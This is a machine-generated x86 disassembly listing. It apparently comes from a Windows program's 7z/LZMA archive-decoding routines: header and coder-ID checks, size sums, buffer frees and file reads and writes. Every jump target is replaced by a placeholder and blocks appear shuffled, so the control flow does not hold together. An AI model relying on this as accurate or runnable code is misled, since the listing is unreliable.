pop esi
retn
cmp eax 0x4
ja r-xdata
mov edx [ esi ]
cmp [ edx ] 0x1
jne r-xdata
cmp [ edx + 0x4 ] 0x1
jne r-xdata
cmp [ edx + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov ecx [ edx + 0x8 ]
test ecx ecx
je r-xdata
cmp [ edx + 0x8 ] 0xffffffff
ja r-xdata
cmp eax 0x1
jne r-xdata
cmp ecx 0x21
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ esi + 0x18 ] eax
jne r-xdata
cmp ecx 0x30101
jne r-xdata
cmp eax 0x4
jne r-xdata
cmp [ edx + 0x24 ] 0x0
ja r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
lea ecx [ edx + 0x18 ]
call sub_402130
test eax eax
je r-xdata
jb r-xdata
cmp [ esi + 0x14 ] 0x0
jne r-xdata
lea ecx [ edx + 0x30 ]
call sub_402130
test eax eax
je r-xdata
cmp [ edx + 0x18 ] 0x1
jne r-xdata
cmp [ edx + 0x20 ] 0xffffffff
ja r-xdata
xor eax eax
pop esi
retn
cmp [ edx + 0x50 ] 0x303011b
jne r-xdata
cmp [ edx + 0x1c ] 0x1
jne r-xdata
cmp [ edx + 0x54 ] 0x0
jne r-xdata
cmp [ esi + 0x18 ] 0x1
jne r-xdata
cmp [ edx + 0x48 ] 0x4
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ edx + 0x4c ] 0x1
jne r-xdata
cmp [ esi + 0x14 ] 0x1
jne r-xdata
cmp [ esi + 0x18 ] 0x4
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x2
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x6
jne r-xdata
mov eax [ edx + 0x20 ]
cmp eax 0x3030103
je r-xdata
cmp [ eax + 0x8 ] 0x1
jne r-xdata
xor eax eax
pop esi
retn
cmp eax 0x3030501
jne r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] 0x3
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] 0x5
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x4
jne r-xdata
cmp [ eax + 0xc ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x2
jne r-xdata
xor eax eax
pop esi
retn
sub_402310
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xorps xmm0 xmm0
xor eax eax
push edi
mov [ ebp - 0x18 ] edx
mov esi ecx
movlpd [ ebp - 0x20 ] xmm0
test edx edx
je r-xdata
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x20 ]
cmp edx 0x4
jb r-xdata
pop edi
pop esi
mov eax ebx
mov edx ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x20 ]
mov ecx edx
sub ecx eax
cmp ecx 0x2
jl r-xdata
mov ecx edx
and ecx 0x3
mov edi edx
sub edi ecx
xorps xmm2 xmm2
xorps xmm1 xmm1
mov ecx esi
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x10 ]
lea ecx [ edx - 0x1 ]
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x1c ]
movdqu xmm0 [ ecx ]
add eax 0x4
paddq xmm2 xmm0
movdqu xmm0 [ ecx + 0x10 ]
lea ecx [ ecx + 0x20 ]
paddq xmm1 xmm0
cmp eax edi
jb r-xdata
paddq xmm1 xmm2
movdqa xmm0 xmm1
psrldq xmm0 0x8
paddq xmm1 xmm0
movd ebx xmm1
psrldq xmm1 0x4
movd ecx xmm1
jmp r-xdata
add edi [ ebp - 0xc ]
adc ecx [ ebp - 0x14 ]
add ebx edi
adc edx ecx
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add ebx [ esi + eax * 8 ]
adc edx [ esi + eax * 8 + 0x4 ]
add ebx [ esi + eax * 8 ]
adc edx [ esi + eax * 8 + 0x4 ]
add edi [ esi + eax * 8 + 0x8 ]
adc ecx [ esi + eax * 8 + 0xc ]
add eax 0x2
cmp eax [ ebp - 0x14 ]
jb r-xdata
mov [ ebp - 0xc ] ebx
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x18 ]
jmp r-xdata
xorps xmm0 xmm0
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
movlpd [ ebp - 0x10 ] xmm0
movlpd [ ebp - 0x20 ] xmm0
cmp eax edx
jae r-xdata
cmp eax edx
mov edx [ ebp - 0x4 ]
jae r-xdata
sub_402420
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x18 ]
push edi
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x20 ]
mov edi ecx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x40 ] 0x0
call sub_402170
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x10 ]
xor ebx ebx
test edx edx
je r-xdata
xor eax eax
nop
mov eax [ ebp - 0x20 ]
mov esi [ ebp - 0x2c ]
xor ecx ecx
mov [ ebp - 0x30 ] eax
cmp edx 0x4
jne r-xdata
cmp eax 0x21
je r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ edx + ecx * 8 ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + ecx * 8 + 0x4 ]
mov edx ecx
mov ecx [ ebp - 0x38 ]
mov [ ebp - 0x28 ] eax
call sub_402310
add eax [ ebp + 0xc ]
push 0x0
adc edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] edx
call eax
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x5c ] ecx
mov eax [ eax + 0xc ]
mov [ ebp - 0x64 ] 0x3
mov edi [ eax + ebx * 8 ]
mov ecx [ eax + ebx * 8 + 0x4 ]
lea eax [ ebx * 4 ]
mov [ ebp - 0x60 ] 0x2
mov [ ebp - 0x4c ] eax
mov eax [ ebp + eax - 0x64 ]
mov [ ebp - 0x28 ] eax
cmp ebx 0x2
jae r-xdata
cmp eax 0x30101
je r-xdata
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov eax ecx
or eax edx
jne r-xdata
jne r-xdata
xor eax eax
mov [ ebp - 0x30 ] edi
cmp edi edi
jne r-xdata
mov ecx eax
mov eax [ edi + 0xc ]
cmp ecx 0x303011b
jne r-xdata
cmp ecx 0x30101
jne r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x30 ]
jne r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
test ecx ecx
ja r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
cmp eax ecx
jne r-xdata
cmp ebx 0x1
jne r-xdata
test eax eax
jne r-xdata
cmp ecx 0x21
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x28 ]
test eax eax
jne r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x20 ]
jb r-xdata
mov eax [ ebp - 0x34 ]
push edi
push eax
mov eax [ eax ]
call eax
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp ecx 0x3030103
jne r-xdata
mov eax [ ebp - 0x38 ]
mov esi [ eax + 0x8 ]
mov edi [ eax + 0xc ]
cmp ebx 0x3
jne r-xdata
test edx edx
jne r-xdata
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x1c ]
push [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
push esi
push [ ebp - 0x28 ]
push ecx
mov ecx edi
call sub_401d30
jmp r-xdata
push eax
push ecx
mov ecx [ ebp - 0x24 ]
mov edx esi
call sub_402070
add esp 0x8
jmp r-xdata
mov esi eax
sub esi edi
add esi [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x48 ] edi
cmp edi eax
ja r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x3c ]
neg eax
mov [ eax + ecx + 0x4 ] esi
mov [ ebp + eax - 0x54 ] edi
jmp r-xdata
test edi edi
jne r-xdata
cmp ecx 0x3030501
jne r-xdata
test eax eax
jne r-xdata
lea edx [ ebx - 0x2 ]
mov ecx eax
call sub_402310
add eax [ ebp + 0xc ]
push 0x0
adc edx [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax + 0xc ]
mov [ ebp - 0x14 ] edx
call eax
add esp 0xc
test eax eax
jne r-xdata
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x1c ]
push [ ebp - 0x30 ]
mov edx [ ebp - 0x24 ]
push esi
push [ ebp - 0x28 ]
push ecx
mov ecx edi
call sub_401ed0
add esp 0x14
test eax eax
jne r-xdata
mov ecx [ ebp - 0x28 ]
mov edi [ ebp - 0x1c ]
test eax eax
jne r-xdata
push ecx
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
push ecx
mov ecx [ ebp - 0x2c ]
mov edx esi
call sub_4060f0
add esp 0xc
jmp r-xdata
cmp esi esi
jne r-xdata
mov esi [ ebp - 0x20 ]
mov ecx [ ebp - 0x2c ]
sub esp 0x8
mov edx esi
call sub_406090
add esp 0x8
jmp r-xdata
mov edi [ ebp - 0x44 ]
inc ebx
mov edx [ edi + 0x10 ]
cmp ebx edx
jb r-xdata
cmp eax edi
jne r-xdata
mov eax [ edi ]
lea ecx [ ebx + ebx * 2 ]
lea edi [ eax + ecx * 8 ]
mov [ ebp - 0x1c ] edi
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x34 ]
push esi
push eax
mov eax [ eax ]
call eax
mov ecx [ ebp - 0x3c ]
add esp 0x8
mov [ ecx + 0x8 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x24 ]
push edi
push esi
mov edx eax
call sub_402070
add esp 0x8
test eax eax
jne r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x48 ]
mov ecx [ ebp - 0x40 ]
push eax
push [ ebp - 0x2c ]
mov eax [ ebp - 0x3c ]
push esi
push [ eax + 0x8 ]
push [ ebp - 0x54 ]
push [ eax + 0x4 ]
push [ ebp - 0x58 ]
push [ eax ]
call sub_405db0
add esp 0x20
jmp r-xdata
sub_4027e0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x1c ]
lea ebx [ ebp - 0x10 ]
push ebx
push edi
push [ ebp + 0x18 ]
mov [ ebp - 0x10 ] 0x0
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x0
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x0
push esi
call sub_402420
add esp 0x1c
mov ebx eax
xor esi esi
lea ecx [ ecx ]
push [ ebp + esi * 4 - 0x10 ]
mov ecx [ edi + 0x4 ]
push edi
call ecx
inc esi
add esp 0x8
cmp esi 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_402860
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx edx
mov esi [ edi ]
mov [ ebp - 0xc ] ecx
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ edi ] 0x0
mov edx __dos_header
lea esp [ esp ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx __dos_header
test esi esi
jne r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
mov eax esi
cmp esi __dos_header
cmova eax edx
push eax
push ebx
push [ ecx ]
mov [ ebp - 0x8 ] 0x0
call [ ReadFile@IAT ]
mov ecx [ ebp - 0x8 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
sub_402900
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx edx
mov esi [ edi ]
mov [ ebp - 0xc ] ecx
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
mov [ edi ] 0x0
mov edx __dos_header
lea esp [ esp ]
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx __dos_header
test esi esi
jne r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
mov eax esi
cmp esi __dos_header
cmova eax edx
push eax
push ebx
push [ ecx ]
mov [ ebp - 0x8 ] 0x0
call [ WriteFile@IAT ]
mov ecx [ ebp - 0x8 ]
add [ edi ] ecx
add ebx ecx
sub esi ecx
test eax eax
je r-xdata
sub_4029a0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
push ebx
push esi
push edi
mov edi edx
mov ebx ecx
mov esi [ edi ]
mov edx [ edi + 0x4 ]
mov eax esi
mov cl 0x20
mov [ ebp - 0x14 ] esi
call sub_42d440
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
cdq
xor ecx ecx
or ecx esi
mov [ edi + 0x4 ] eax
mov [ edi ] ecx
xor eax eax
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push esi
push [ ebx ]
call [ SetFilePointer@IAT ]
mov esi eax
mov [ ebp - 0x14 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x57
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4170bc
mov esp ebp
pop ebp
retn
sub_402a50
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
lea ecx [ ecx + 0x8 ]
call sub_402860
add esp 0x4
neg eax
sbb eax eax
and eax 0x8
pop ebp
retn
sub_402a90
push ebp
mov ebp esp
sub esp 0x8
push ebx
push edi
mov edi ecx
mov ebx edx
cmp [ edi ] 0x0
je r-xdata
push [ edi ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ edi + 0x4 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ edi + 0x8 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ edi + 0xc ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
add esp 0x20
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
mov [ edi + 0xc ] 0x0
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x18 ] 0x0
mov [ edi + 0x1c ] 0x0
mov [ edi + 0x20 ] 0x0
mov [ edi + 0x24 ] 0x0
pop edi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
jbe r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] ecx
push esi
mov esi [ edi ]
mov eax [ ebx + 0x4 ]
push [ esi + ecx + 0x10 ]
add esi ecx
push ebx
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
inc eax
add ecx 0x18
add esp 0x8
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
cmp eax [ edi + 0x10 ]
jb r-xdata
pop esi
sub_402b60
push esi
push edi
mov edi ecx
xor eax eax
mov edx [ edi + 0x10 ]
xor esi esi
test edx edx
je r-xdata
pop edi
pop esi
retn
cmp edx 0x4
jb r-xdata
cmp esi edx
jae r-xdata
mov eax edx
and eax 0x3
mov ecx edx
push ebx
mov ebx [ edi ]
sub ecx eax
xorps xmm4 xmm4
xor eax eax
lea esp [ esp ]
mov edi [ edi ]
lea ecx [ esi + esi * 2 ]
shl ecx 0x3
sub edx esi
nop
movd xmm2 [ eax + ebx + 0x4c ]
movd xmm0 [ eax + ebx + 0x34 ]
movd xmm1 [ eax + ebx + 0x1c ]
movd xmm3 [ eax + ebx + 0x4 ]
punpckldq xmm3 xmm0
punpckldq xmm1 xmm2
add esi 0x4
punpckldq xmm3 xmm1
paddd xmm4 xmm3
lea eax [ eax + 0x60 ]
cmp esi ecx
jb r-xdata
movdqa xmm0 xmm4
psrldq xmm0 0x8
pop ebx
paddd xmm4 xmm0
movdqa xmm0 xmm4
psrldq xmm0 0x4
paddd xmm4 xmm0
movd eax xmm4
add eax [ ecx + edi + 0x4 ]
lea ecx [ ecx + 0x18 ]
dec edx
jne r-xdata
sub_402c00
push esi
push edi
mov edi ecx
call sub_402b60
mov esi eax
test esi esi
je r-xdata
pop edi
xor eax eax
xor edx edx
pop esi
retn
dec esi
js r-xdata
mov edx [ edi + 0x14 ]
mov edx [ edi + 0xc ]
pop edi
mov eax [ edx + esi * 8 ]
mov edx [ edx + esi * 8 + 0x4 ]
pop esi
retn
mov eax [ edi + 0x4 ]
add eax 0x4
test ecx ecx
js r-xdata
inc ecx
add eax 0x8
cmp ecx edx
jb r-xdata
dec esi
jns r-xdata
cmp [ eax ] esi
je r-xdata
xor ecx ecx
test edx edx
je r-xdata
sub_402c50
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ esi + 0xc ] 0x0
mov [ ebp - 0x4 ] ebx
je r-xdata
push [ esi ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ esi + 0x8 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ esi + 0xc ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
push [ esi + 0x10 ]
mov eax [ ebx + 0x4 ]
push ebx
call eax
add esp 0x28
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
mov [ esi + 0x18 ] 0x0
mov [ esi + 0x1c ] 0x0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
xor edi edi
cmp [ esi + 0x18 ] edi
jbe r-xdata
pop edi
xor ebx ebx
lea ecx [ ecx ]
mov ecx [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
add ecx ebx
call sub_402a90
inc edi
add ebx 0x28
cmp edi [ esi + 0x18 ]
jb r-xdata
mov ebx [ ebp - 0x4 ]
sub_402d00
mov [ ecx ] 0x0
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ecx + 0x10 ] 0x0
mov [ ecx + 0x14 ] 0x0
mov [ ecx + 0x18 ] 0x0
mov [ ecx + 0x1c ] 0x0
mov [ ecx + 0x30 ] 0x0
mov [ ecx + 0x34 ] 0x0
mov [ ecx + 0x38 ] 0x0
mov [ ecx + 0x3c ] 0x0
mov [ ecx + 0x40 ] 0x0
mov [ ecx + 0x44 ] 0x0
mov [ ecx + 0x48 ] 0x0
retn
sub_402d70
push esi
push edi
mov edi ecx
mov esi edx
push [ edi + 0x30 ]
mov eax [ esi + 0x4 ]
push esi
call eax
push [ edi + 0x34 ]
mov eax [ esi + 0x4 ]
push esi
call eax
push [ edi + 0x38 ]
mov eax [ esi + 0x4 ]
push esi
call eax
push [ edi + 0x3c ]
mov eax [ esi + 0x4 ]
push esi
call eax
push [ edi + 0x40 ]
mov eax [ esi + 0x4 ]
push esi
call eax
push [ edi + 0x44 ]
mov eax [ esi + 0x4 ]
push esi
call eax
add esp 0x30
mov edx esi
mov ecx edi
mov [ edi + 0x44 ] 0x0
mov [ edi + 0x48 ] 0x0
call sub_402c50
mov ecx edi
pop edi
pop esi
jmp sub_402d00
sub_402dd0
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov eax [ edi + 0x18 ]
xorps xmm0 xmm0
xor esi esi
mov [ ebp - 0x4 ] edx
movlpd [ ebp - 0x18 ] xmm0
mov [ ebp - 0x8 ] ebx
test eax eax
jne r-xdata
shl eax 0x2
push eax
mov eax [ edx ]
push edx
call eax
add esp 0x8
mov [ edi + 0x30 ] eax
test eax eax
jne r-xdata
mov [ edi + 0x30 ] ebx
mov edx [ edi + 0x18 ]
test edx edx
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x14 ]
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x30 ]
add eax 0x18
shl eax 0x3
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call eax
add esp 0x8
mov [ edi + 0x34 ] eax
test eax eax
je r-xdata
mov [ edi + 0x34 ] esi
jmp r-xdata
mov [ ecx ] ebx
add ebx [ eax ]
lea ecx [ ecx + 0x4 ]
lea eax [ eax + 0x28 ]
dec edx
jne r-xdata
mov ebx [ edi + 0x14 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x18 ]
mov ebx [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x34 ]
mov edx [ ebp - 0x18 ]
sub ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
nop
shl eax 0x2
push eax
mov eax [ ebx ]
push ebx
call eax
add esp 0x8
mov [ edi + 0x38 ] eax
test eax eax
je r-xdata
mov [ edi + 0x38 ] eax
jmp r-xdata
mov [ esi + eax ] edx
mov [ esi + eax + 0x4 ] ecx
add edx [ eax ]
adc ecx [ eax + 0x4 ]
lea eax [ eax + 0x8 ]
dec ebx
jne r-xdata
xor esi esi
mov eax [ edi + 0x1c ]
test eax eax
jne r-xdata
shl eax 0x2
push eax
mov eax [ ebx ]
push ebx
call eax
add esp 0x8
mov [ edi + 0x3c ] eax
test eax eax
je r-xdata
mov [ edi + 0x3c ] eax
jmp r-xdata
xor edx edx
cmp [ edi + 0x1c ] edx
jbe r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x10 ]
add ecx 0x18
mov [ ebp - 0x4 ] ecx
xor ebx ebx
nop
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ edi + 0x3c ]
mov [ eax + edx * 4 ] esi
jne r-xdata
mov ebx [ edi + 0x18 ]
lea ecx [ esi + esi * 4 ]
shl ecx 0x3
jmp r-xdata
mov eax [ edi + 0x3c ]
mov [ eax + edx * 4 ] 0xffffffff
jmp r-xdata
inc edx
add ecx 0x20
mov [ ebp - 0x4 ] ecx
cmp edx [ edi + 0x1c ]
jb r-xdata
mov eax [ edi + 0xc ]
lea ecx [ esi + esi * 4 ]
inc ebx
cmp ebx [ eax + ecx * 8 + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ebx
jb r-xdata
cmp esi ebx
jae r-xdata
xor eax eax
cmp [ ecx ] al
sete al
mov [ ebp - 0xc ] eax
test eax eax
je r-xdata
inc esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
pop edi
pop esi
mov eax 0x10
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x38 ]
mov [ eax + esi * 4 ] edx
mov eax [ edi + 0xc ]
cmp [ eax + ecx + 0x24 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
inc esi
add ecx 0x28
jmp r-xdata
sub_402f80
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov edx [ ebp + 0x8 ]
push edi
xor edi edi
mov esi ecx
test edx edx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x10
pop ebx
pop ebp
retn
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov al [ ecx ]
mov [ edi + ebx ] al
inc edi
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
cmp edi edx
jb r-xdata
sub_402fc0
push esi
push edi
mov edi edx
mov eax ecx
mov [ edi ] 0x0
xor esi esi
mov edi edi
pop edi
mov eax 0x10
pop esi
retn
dec ecx
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
inc ecx
mov dl [ ecx - 0x1 ]
movzx edx dl
mov [ eax ] ecx
mov ecx esi
shl edx cl
add esi 0x8
or [ edi ] edx
cmp esi 0x20
jl r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
pop edi
xor eax eax
pop esi
retn
sub_403010
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi edx
mov [ ebp - 0xc ] ecx
mov bl 0x80
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x10
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
dec esi
mov bh [ eax ]
lea edx [ eax + 0x1 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
mov [ edi ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
movzx eax bl
movzx ecx bh
dec eax
and eax ecx
mov ecx [ ebp - 0x8 ]
cdq
shl ecx 0x3
call sub_430160
add [ edi ] eax
adc [ edi + 0x4 ] edx
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov al [ edx ]
inc edx
movzx eax al
mov [ ecx ] edx
dec esi
mov [ ebp - 0x10 ] edx
mov [ ecx + 0x4 ] esi
mov ecx [ ebp - 0x4 ]
cdq
call sub_430160
or [ edi ] eax
mov eax [ ebp - 0x4 ]
or [ edi + 0x4 ] edx
inc [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add eax 0x8
shr bl 0x1
mov [ ebp - 0x4 ] eax
cmp eax 0x40
jl r-xdata
test bl bh
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4030d0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi edx
lea edx [ ebp - 0x8 ]
call sub_403010
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
test ecx ecx
jne r-xdata
mov eax 0x4
mov eax [ ebp - 0x8 ]
cmp eax 0x80000000
jae r-xdata
test ecx ecx
jne r-xdata
cmp eax 0x4000000
jae r-xdata
mov [ esi ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
sub_403120
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0x8 ]
